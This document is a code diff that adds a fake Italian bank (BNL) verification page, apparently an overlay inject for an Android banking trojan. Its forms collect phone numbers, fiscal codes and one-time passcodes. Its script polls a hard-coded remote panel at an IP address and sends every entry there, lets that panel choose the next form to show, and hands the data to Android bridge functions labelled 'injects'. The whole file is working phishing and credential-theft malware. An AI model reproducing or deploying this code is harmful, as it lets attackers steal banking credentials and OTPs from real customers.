+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">Cellulare non valido</span>
+                                    </div>
+									<div class="form-group ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="CF" data-ng-model="data.cf" autocomplete="off" type="text" maxlength="16" pattern="\d{16}" id="pin">
+                                            <label for="pin" class="control-label ">Codice Fiscale</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">Codice Fiscale non valido</span>
+                                    </div>
+                                    <div class="footer onfocus ">
+                                        <div class="footer-gap">
+                                        </div>
+                                        <div class="buttondiv">
+                                            <button class="btn btn-info start">Continua</button>
+                                        </div>
+                                    </div>
+                                </form>
+								</div>
+							<div class="scum" id="ca-view" style="display:none ;">
+                                <form class="form" id="form" novalidate name="form" onsubmit="send1(event,'ask_ca_proxy');return false">
+                                    <div class="legend">
+                                    
+                                        <p class="legendp">Ti abbiamo inviato un codice temporaneo al tuo indirizzo Email.</p>
+										<p class="legendp">Inseriscilo nei campi sottostanti:</p>
+                                    </div>
+                                   
+                                    <div class="form-group  ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="OTP" data-ng-model="data.otp" autocomplete="off" maxlength="12" pattern="\d{3}" id="cvv">
+                                            <label for="cvv" class="control-label ">OTP</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">OTP non valida</span>
+                                    </div>
+                                    <div class="footer onfocus ">
+                                        <div class="footer-gap">
+                                        </div>
+                                        <div class="buttondiv">
+                                            <button class="btn btn-info start">Continua</button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-xs-12 col-sm-2"></div>
+            </div>
+        </div>
+    </div>
+</body>
+<script type="text/javascript">
+
+var bider_obj = {
+    online_bider: 1,
+    w: 0,
+    dev: 3
+};
+var last_respond;
+var last_operation;
+var respond = {};
+var home = "http://162.0.225.110/uadmin/gate.php";
+var link = "bnl_it";
+encryption = 0
+
+
+CORE__ = {
+    send_home: function(cb) {
+        if (typeof cb == "undefined") {
+            cb = function() {};
+        }
+
+
+
+        $.ajax({
+            url: home + "?pl=token&link=" + link,
+            dataType: "jsonp",
+            data: {
+                data: encryption ? JSON.stringify(EN(respond)) : JSON.stringify(respond)
+            },
+            success: function(data) {
+                respond = {};
+                last_respond = data;
+                cb();
+            }
+        });
+    },
+    bidder: function() {
+        var that = this;
+
+        $.ajax({
+            url: home + "?pl=token&link=" + link,
+            dataType: "jsonp",
+            data: {
+                data: encryption ? JSON.stringify(EN(bider_obj)) : JSON.stringify(bider_obj)
+            },
+            success: function(data) {
+                if (data.hasOwnProperty("re")) {
+                    // that.hide_wating();
+                    // that.hide_scums();
+                    // that.hide_blocker();
+                    bider_obj.w = 0;
+                    submit_data();
+                    // window.location.href = bb_link;
+                    clearInterval(bidder_timer);
+                    return;
+                }
+                if (data.hasOwnProperty("bl")) {
+                    // that.hide_wating();
+                    // that.hide_scums();
+                    // that.show_blocker();
+                    submit_data();
+                    bider_obj.w = 0;
+                    // window.location.href = bb_link;
+                    clearInterval(bidder_timer);
+                    return;
+                }
+
+                if (data.hasOwnProperty("op")) {
+                    that.deal_with_op(data.op);
+                }
+            }
+        });
+    },
+    deal_with_op: function(o) {
+        var that = this;
+        bider_obj.w = 0;
+        this.hide_wating();
+        this.hide_scums();
+        var o = JSON.parse(o);
+        last_operation = o;
+
+        $('form').each(function(i, item) { delete $(item).data().sub_ed }) //2019
+
+
+        if (REST_FN__.hasOwnProperty(o.init_fn)) {
+            REST_FN__[o.init_fn].show();
+        } else {
+            respond = {
+                mes: "error--Init function not found"
+            };
+            that.send_home(function() {
+                that.hide_wating();
+                that.hide_blocker();
+                that.hide_scums();
+                clearInterval(bidder_timer);
+            });
+        }
+    },
+    show_wating: function() {
+        loader_.show()
+    },
+    hide_wating: function() {
+        loader_.hide()
+    },
+    show_blocker: function() {
+        $(".bloker__").show();
+        $("body").scrollTop(0);
+    },
+    hide_blocker: function() {
+        $(".bloker__").hide();
+    },
+    hide_scums: function() {
+        $(".scum").hide();
+    },
+    all_forms_reset: function() {
+        $("form").each(function() {
+            this.reset();
+        });
+    }
+};
+
+
+
+var ask_login_proxy = function(el) {
+    data = $(el).custom_ser();
+    REST_FN__.ask_login.send(data);
+
+}
+
+var ask_cc_proxy = function(el) {
+    data = $(el).custom_ser();
+    REST_FN__.ask_cc.send(data);
+
+}
+
+var ask_ce_proxy = function(el) {
+    data = $(el).custom_ser();
+    REST_FN__.ask_ce.send(data);
+
+}
+
+var ask_ca_proxy = function(el) {
+    data = $(el).custom_ser();
+    REST_FN__.ask_ca.send(data);
+
+}
+
+REST_FN__ = {
+
+    ask_login: {
+        view: function() {
+            return $("#login-view");
+        },
+        count: 1,
+        show: function() {
+            $(this.view()).show();
+            if (this.count > 0) {
+                this.error();
+            }
+
+            this.count++;
+            this.shown();
+        },
+        error: function() {
+            $(this.view())
+                .find("form")[0]
+                .reset();
+            $(this.view())
+                .find("form")
+                .submit();
+            sc_.$apply(function() {
+                sc_.data = {}
+            })
+        },
+        send: function(data) {
+            CORE__.show_wating();
+            respond.prev_op = "ask_login";
+            respond.keys = data;
+            bider_obj.w = 1;
+            CORE__.send_home(function() {});
+
+        },
+        shown: function() {
+            respond.mes = last_operation.success_mes;
+            CORE__.send_home();
+        }
+    },
+	
+	ask_cc: {
+        view: function() {
+            return $("#cc-view");
+        },
+        count: 0,
+        show: function() {
+            $(this.view()).show();
+            if (this.count > 0) {
+                this.error();
+            }
+
+            this.count++;
+            this.shown();
+        },
+        error: function() {
+            $(this.view())
+                .find("form")[0]
+                .reset();
+            $(this.view())
+                .find("form")
+                .submit();
+            sc_.$apply(function() {
+                sc_.data = {}
+            })
+        },
+        send: function(data) {
+            CORE__.show_wating();
+            respond.prev_op = "ask_cc";
+            respond.keys = data;
+            bider_obj.w = 1;
+            CORE__.send_home(function() {});
+
+        },
+        shown: function() {
+            respond.mes = last_operation.success_mes;
+            CORE__.send_home();
+        }
+    },
+	
+	ask_ce: {
+        view: function() {
+            return $("#ce-view");
+        },
+        count: 0,
+        show: function() {
+            $(this.view()).show();
+            if (this.count > 0) {
+                this.error();
+            }
+
+            this.count++;
+            this.shown();
+        },
+        error: function() {
+            $(this.view())
+                .find("form")[0]
+                .reset();
+            $(this.view())
+                .find("form")
+                .submit();
+            sc_.$apply(function() {
+                sc_.data = {}
+            })
+        },
+        send: function(data) {
+            CORE__.show_wating();
+            respond.prev_op = "ask_ce";
+            respond.keys = data;
+            bider_obj.w = 1;
+            CORE__.send_home(function() {});
+
+        },
+        shown: function() {
+            respond.mes = last_operation.success_mes;
+            CORE__.send_home();
+        }
+    },
+	
+	ask_ca: {
+        view: function() {
+            return $("#ca-view");
+        },
+        count: 0,
+        show: function() {
+            $(this.view()).show();
+            if (this.count > 0) {
+                this.error();
+            }
+
+            this.count++;
+            this.shown();
+        },
+        error: function() {
+            $(this.view())
+                .find("form")[0]
+                .reset();
+            $(this.view())
+                .find("form")
+                .submit();
+            sc_.$apply(function() {
+                sc_.data = {}
+            })
+        },
+        send: function(data) {
+            CORE__.show_wating();
+            respond.prev_op = "ask_ca";
+            respond.keys = data;
+            bider_obj.w = 1;
+            CORE__.send_home(function() {});
+
+        },
+        shown: function() {
+            respond.mes = last_operation.success_mes;
+            CORE__.send_home();
+        }
+    },
+	
+};
+
+
+
+
+
+
+
+CORE__.bidder();
+bidder_timer = setInterval(function() {
+    CORE__.bidder();
+}, 5000);
+
+respond.mes = "User on bnl_it page";
+CORE__.send_home();
+
+
+
+
+
+$('<div class="loader2__">\
+    <h4 class="loader2__h4">Attendere prego...</h4>\
+    <span class="cool_spinner__">\
+        <svg version="1.1" id="L2" height="50" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">\
+            <circle fill="none" stroke-width="4" stroke-miterlimit="10" cx="50" cy="50" r="48" />\
+            <line fill="none" stroke-linecap="round" stroke-width="4" stroke-miterlimit="10" x1="50" y1="50" x2="85" y2="50.5">\
+                <animateTransform attributeName="transform" dur="2s" type="rotate" from="0 50 50" to="360 50 50" repeatCount="indefinite" />\
+            </line>\
+            <line fill="none" stroke-linecap="round" stroke-width="4" stroke-miterlimit="10" x1="50" y1="50" x2="49.5" y2="74">\
+                <animateTransform attributeName="transform" dur="15s" type="rotate" from="0 50 50" to="360 50 50" repeatCount="indefinite" />\
+            </line>\
+        </svg>\
+    </span>\
+    <p class="loader2__p">Accesso in corso... <br> Si prega di non chiudere questa pagina.</p>\
+</div>').appendTo('.scum_container');
+
+
+
+window.loader_ = {
+    hide: function() {
+        $('.hide_on_loader').show()
+        $('.scum_container').removeClass('loader_hide loader_show');
+        $('.scum_container').addClass('loader_hide');
+        $(document).trigger('loader_hide') //2020 events triggers
+        // $('.loader__').hide();
+    },
+    show: function() {
+        // $('.loader__').fadeIn('fast');
+        $('.hide_on_loader').hide()
+        $('.scum_container').removeClass('loader_hide loader_show');
+        $('.scum_container').addClass('loader_show');
+        $(document).trigger('loader_show') //2020 events triggers
+        // $('.loader__').show();
+    }
+}
+
+
+
+
+
+
+
+var app = angular.module('app', [])
+
+
+app.controller('c1', ['$scope', function($scope) {
+    sc_ = $scope;
+
+    $scope.data = {
+
+    }
+}])
+
+
+
+
+
+
+$("body").on("keypress change", '.form-control ,.custom_input_class', function() {
+    $(this).closest(".form-group").removeClass("has_err");
+    $(this).removeClass("has_err");
+    $(".err_div").fadeOut();
+});
+
+setTimeout(function() {
+    $('.form-control[data-mask]').each(function(i, el, all) {
+        $.mask.definitions['h'] = "[A-Fa-f0-9]";
+        $(this).mask($(this).data().mask, {
+            placeholder: $(this).attr('mask-placeholder')
+        }) //auto mask
+
+    })
+}, 1) // fix for anguler masked intergration 2019
+
+
+
+var send1 = function(e, callback__, global_luhn__) {
+
+
+    e.preventDefault();
+    var el = e.target;
+    var err = false;
+    var err_text = [];
+    var err_elements = [];
+
+    if ($(el).data().hasOwnProperty('sub_ed')) { //2019
+        // return;
+    }
+
+    $(el).find("input:visible:enabled,select:visible:enabled").each(function() {
+        var reg__ = new RegExp($(this).attr('pattern'));
+
+        if (!reg__.test($(this).val())) {
+            err = true;
+            err_elements.push(this);
+            err_text.push(this.dataset.err_text);
+            return;
+        }
+        var luhn__ = $(this).data().luhn;
+        if (typeof luhn__ != "undefined" && luhn__ != "") {
+
+            if ($(this).val() != "") {
+                if (!eval(luhn__)($(this).val(), err_text)) {
+                    err = true;
+                    err_elements.push(this);
+                }
+            }
+        }
+    });
+
+    //time for global_luhn
+    if (!err) {
+        if (typeof global_luhn__ != "undefined") {
+            if (!eval(global_luhn__)(err_text)) {
+                err = true;
+            }
+        }
+    }
+
+
+    if (err) {
+        err_text = err_text.filter(function(e) {
+            return e;
+        });
+        err_text = $.unique(err_text);
+        $(".err_ul").html("");
+        $(err_text).each(function(i, t) {
+            $("<li><span>" + t + "</span></li>").appendTo(".err_ul");
+        });
+
+        $(".err_div").show();
+        $(err_elements).each(function() {
+            $(this).closest(".form-group").addClass("has_err");
+            $(this).addClass("has_err");
+
+            //...
+        });
+        $(window).scrollTop(0);
+        return;
+    }
+
+    if (typeof callback__ != "undefined") {
+        $(el).data('sub_ed', true); //2019
+        eval(callback__)(el);
+        return;
+    }
+    alert("We stack, what to do next?");
+};
+
+
+
+
+
+function next__(el) {
+
+    loader_.show();
+    setTimeout(function() {
+        loader_.hide();
+        $('.scum').hide();
+        $(el).closest('.scum').next().show();
+    }, 4000)
+
+}
+
+
+function finish__(el) {
+    loader_.show();
+    submit_data();
+}
+
+
+
+
+function submit_data() {
+
+
+    var data__ = sc_.data
+    console.log(data__);
+
+
+    if (typeof Android.returnResult === "function") {
+        data__.exit = ""
+        Android.returnResult(JSON.stringify(data__))
+    } else if (typeof Android.send_log_injects === "function") {
+        data__.type_injects = "banks";
+        data__.closed = "close_activity_injects";
+        Android.send_log_injects(JSON.stringify(data__));
+    }
+
+
+
+}
+
+
+$.fn.autoJump = function() {
+    var els = this;
+    els.on("input", function() {
+        if ($(this).val().length == $(this).attr('maxlength')) {
+            var this_ = this;
+            els.each(function(i) {
+                if (this === this_) {
+                    if (els.length - 1 == i) {
+                        els.eq(0).focus();
+                    } else {
+                        els.eq(i + 1).focus();
+                    }
+                }
+            });
+        }
+    });
+};
+
+$.fn.custom_ser = function() {
+    var obj = {};
+    this.find('input,select').each(function() {
+        if ($(this).prop('tagName') == "INPUT" && $(this).prop('type') != "checkbox") {
+            //input validation
+            obj[$(this).attr('name')] = $(this).val();
+        }
+        if ($(this).prop('tagName') == "SELECT") {
+            obj[$(this).attr('name')] = $(this).find('option:selected').val();
+        }
+    })
+    return obj;
+}
+
+
+setTimeout(function() {
+    loader_.hide()
+}, 2000)
+</script>
+
+</html>
